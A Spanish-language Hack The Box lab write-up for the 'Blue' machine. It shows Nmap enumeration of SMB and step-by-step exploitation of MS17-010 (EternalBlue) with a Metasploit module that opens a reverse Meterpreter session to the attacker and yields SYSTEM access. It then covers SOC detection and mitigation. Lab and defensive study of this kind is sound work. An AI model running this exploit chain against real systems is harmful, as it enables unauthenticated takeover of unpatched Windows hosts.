# HTB - Blue (EternalBlue / MS17-010)

---

## Recopilación de información

<aside>
💡

### Fase de enumeración

Se inicia el laboratorio con la identificación de la máquina objetivo dentro de la red. Una vez localizada la IP, se realiza un escaneo completo de puertos con Nmap para identificar servicios expuestos.

El escaneo revela múltiples puertos abiertos, destacando especialmente el servicio **SMB (puerto 445)**, ampliamente utilizado en sistemas Windows para compartir archivos e impresoras.

Dado que SMB ha sido históricamente un vector crítico de ataque, se prioriza su análisis en profundidad.

</aside>

### Comandos de enumeración

```bash id="enum01"
sudo nmap -p- -sS --min-rate 5000 -n -Pn IP -oN puertos.txt
```

```bash id="enum02"
sudo nmap -p445 -sCV IP -oN smb.txt
```

---

## Análisis del servicio SMB

<aside>
💡

El análisis del puerto 445 revela que el sistema ejecuta **Windows 7 Professional**, versión conocida por ser vulnerable a **MS17-010**.

Esta vulnerabilidad afecta al protocolo SMBv1 y permite la ejecución remota de código sin autenticación.

Fue explotada masivamente en ataques reales como:

* WannaCry
* NotPetya

Lo que la convierte en una de las vulnerabilidades más críticas de la última década.

</aside>

```bash id="enum03"
nmap --script smb-vuln-ms17-010 -p445 IP
```

---

## Identificación de vulnerabilidad

```bash id="vuln01"
searchsploit ms17-010
```

<aside>
💡

Se confirma que el sistema es vulnerable a **EternalBlue**, exploit desarrollado originalmente por la NSA y filtrado posteriormente.

Este exploit permite:

* Ejecución remota de código
* Acceso sin credenciales
* Compromiso completo del sistema

</aside>

---

## Explotación

### Uso de Metasploit

```bash id="expl01"
msfconsole
```

```bash id="expl02"
search ms17_010
```

```bash id="expl03"
use exploit/windows/smb/ms17_010_eternalblue
```

```bash id="expl04"
set RHOSTS IP
set LHOST IP_ATACANTE
run
```

<aside>
💡

Tras ejecutar el exploit, se obtiene acceso remoto al sistema mediante una sesión Meterpreter.

</aside>

---

## Post-explotación

```bash id="post01"
getuid
```

```bash id="post02"
sysinfo
```

Resultado:

```text id="post03"
NT AUTHORITY\SYSTEM
```

<aside>
💡

Esto indica que se han obtenido privilegios máximos, permitiendo control total del sistema comprometido.

</aside>

---

## Análisis del ataque (enfoque ofensivo)

Cadena de ataque ejecutada:

1. Descubrimiento de servicios expuestos
2. Identificación de SMB vulnerable
3. Enumeración de versión del sistema
4. Explotación de MS17-010
5. Ejecución remota de código
6. Escalada directa a SYSTEM

---

## Enfoque SOC (detección)

<aside>
💡

Desde el punto de vista defensivo, este ataque es altamente detectable si existen controles adecuados.

</aside>

### Indicadores de compromiso (IoC)

* Escaneos agresivos de puertos (Nmap)
* Tráfico anómalo en puerto 445
* Uso de SMBv1
* Intentos de explotación MS17-010
* Creación de sesiones remotas no autorizadas

---

### Logs relevantes

* **Windows Event Logs**

  * Logon events (4624, 4625)
* **Firewall logs**
* **IDS/IPS alerts**
* **SIEM correlación de eventos SMB**

---

### Detección en entorno real

Un SOC podría detectar este ataque mediante:

* Alertas de explotación SMB
* Tráfico lateral sospechoso
* Firma de exploit EternalBlue en IDS
* Comportamiento anómalo de red interna

---

## Enfoque SOC (mitigación y prevención)

<aside>
💡

La mitigación de esta vulnerabilidad es crítica, ya que su explotación no requiere autenticación.

</aside>

### Medidas técnicas

* Aplicar parche **MS17-010**
* Deshabilitar **SMBv1**
* Restringir acceso al puerto 445
* Implementar segmentación de red
* Uso de firewall interno

---

### Medidas de detección

* Implementar **IDS/IPS**
* Monitorizar tráfico SMB
* Correlación en SIEM
* Uso de EDR para detectar comportamiento anómalo

---

### Medidas organizativas

* Política de gestión de parches
* Auditorías periódicas de vulnerabilidades
* Inventario de sistemas legacy

---

## Impacto real

<aside>
💡

La explotación de MS17-010 permite:

* Compromiso total del sistema
* Movimiento lateral en red
* Despliegue de ransomware
* Exfiltración de datos

</aside>

---

## Conclusión

<aside>
💡

Este laboratorio demuestra cómo una vulnerabilidad crítica sin parchear puede comprometer completamente un sistema sin necesidad de credenciales.

La clave del ataque no es la complejidad, sino:

* Falta de actualización
* Exposición de servicios críticos
* Ausencia de monitorización

Desde una perspectiva SOC, este tipo de ataque es altamente detectable y prevenible mediante:

* Gestión de parches
* Monitorización activa
* Segmentación de red

</aside>

---
